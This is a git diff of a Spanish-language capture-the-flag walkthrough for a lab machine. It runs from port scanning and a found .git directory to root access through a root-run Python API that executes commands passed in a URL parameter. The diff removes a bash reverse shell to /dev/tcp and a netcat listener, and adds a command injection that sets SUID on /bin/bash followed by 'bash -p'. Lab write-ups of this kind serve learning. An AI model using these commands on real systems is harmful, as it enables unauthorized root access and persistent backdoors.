@@ -10,13 +10,17 @@ ping 172.18.0.2 -c 1
 
 ![Screenshot 2024-11-16 103630](https://github.com/user-attachments/assets/98973b45-693a-4426-8722-d09e20842a5a)
 
-Realizamos un escaneo de los puertos
+Hacemos un escaneo de los puertos
 
 nmap -sC -sV -Pn 172.18.0.2 -oG escaneo
 
 ![Screenshot 2024-11-16 103847](https://github.com/user-attachments/assets/7c3f10fb-1286-4be3-a496-72c98e456203)
 
-Realizamos un escaneo mas detallado y encontramos un directorio .git
+Añadimos la ip a /etc/hosts
+
+![Screenshot 2024-11-16 104855](https://github.com/user-attachments/assets/8aa55dae-716b-4f12-beec-1e8d80d17d6f)
+
+Hacemos un escaneo mas detallado y encontramos un directorio .git
 
 nmap -sC -sV -Pn --open 172.18.0.2
 
@@ -121,47 +125,55 @@ cat user.txt
 
 ![Screenshot 2024-11-16 115412](https://github.com/user-attachments/assets/646eaf72-a5e0-41df-8d4d-eaabf55afb2e)
 
+
+find / -perm -4000 -ls 2> /dev/null
+
+![Screenshot 2024-11-16 115727](https://github.com/user-attachments/assets/ec11e213-ead9-4d38-b242-8deaf7908f55)
+
+ps -faux
+
+![Screenshot 2024-11-16 115752](https://github.com/user-attachments/assets/9464534a-89ae-4ec9-a2c8-6b6acc5de4f3)
+
 Revisando procesos observamos que tenemos el archivo skullnet_api.py que lo está ejecutando root
 
-ps aux
-
-![Screenshot 2024-11-16 115456](https://github.com/user-attachments/assets/89ca00b4-83a3-4686-a62b-4fef27642f6e)
+![Screenshot 2024-11-16 120010](https://github.com/user-attachments/assets/17479735-ee3c-4b5a-bd5f-5ab5ad9a81a3)
 
 Abrimos el archivo y podemos observar el siguiente escucha en el puerto 8081 y ejecuta comandos cuando recibe una solicitud http get con un parámetro específico
 
-Este código para la parte de autenticación espera un encabezado Authorization con el esquema de basic como tenemos la clave de autenticación AUTH_KEY_BASE64 y si esa sección convertimos de base 64 podemos observar lo siguiente.
+![Screenshot 2024-11-16 120111](https://github.com/user-attachments/assets/26614078-4fbb-4c72-b22f-79284415c038)
+
+Este código para la parte de autenticación espera un encabezado Authorization con el esquema de basic, como tenemos la clave de autenticación AUTH_KEY_BASE64 y si esa sección convertimos de base 64 podemos observar lo siguiente:
 
 echo "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA==" | base64 -d
 
-Con esto en conocimiento la estructura del encabezado de Authorization sería la siguiente.
+Con esto en conocimiento la estructura del encabezado de Authorization sería la siguiente
 
 Authorization: basic we_are_bones_513546516486484
+
+![Screenshot 2024-11-16 120337](https://github.com/user-attachments/assets/da95a1bd-4245-43a9-8018-86fc226da87f)
 
 usamos curl con el parametro exec
 
 Ejecutamos el comando y podemos observar que listamos archivos y también podemos observar que los ejecutamos como root
 
-curl http://localhost:8081/?exec-ls -H 'Authorization: Basic we_are_bones_513546516486484'
-close.sh
-open.sh
-root.txt
+curl http://localhost:8081/?exec=ls -H 'Authorization: Basic we_are_bones_513546516486484'
 
-curl http://localhost:8081/?exec-whoami -H 'Authorization: Basic we_are_bones_513546516486484'
+curl http://localhost:8081/?exec=whoami -H 'Authorization: Basic we_are_bones_513546516486484'
 
-Con esto en mente podemos establecer una revshell
+Encodeamos la URL con https://www.urlencoder.org/
 
-bash -c 'bash -i >& /dev/tcp/172.18.0.2/1234 0>&1'
+whoami; chmod u+s /bin/bash
 
-La URL encodeamos para evitar problemas
+whoami%3B%20chmod%20u%2Bs%20%2Fbin%2Fbash
 
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%22
+![Screenshot 2024-11-16 123436](https://github.com/user-attachments/assets/6dec753e-d6cf-4e71-a65e-55ca9325133b)
 
-iniciamos netcat
+![Screenshot 2024-11-16 123352](https://github.com/user-attachments/assets/91f9c799-2201-4453-84f7-fe77ae7b08d8)
 
-nc -lvnp 1234
+ls -l /bin/bash
 
-URL en codeado sería %3B, Con este permiso lo que hacemos es agregar el comando luego del ls
+bash -p
 
-curl http://localhost:8081/?exec=ls%3Bbash%20-c%20%22bash%20-i%
+whoami
 
-Si vamos a nuestro listener podemos observar que ya tenemos acceso a la consola de root
+![Screenshot 2024-11-16 123704](https://github.com/user-attachments/assets/a8afc596-0c0e-406c-800b-38a969f112ab)
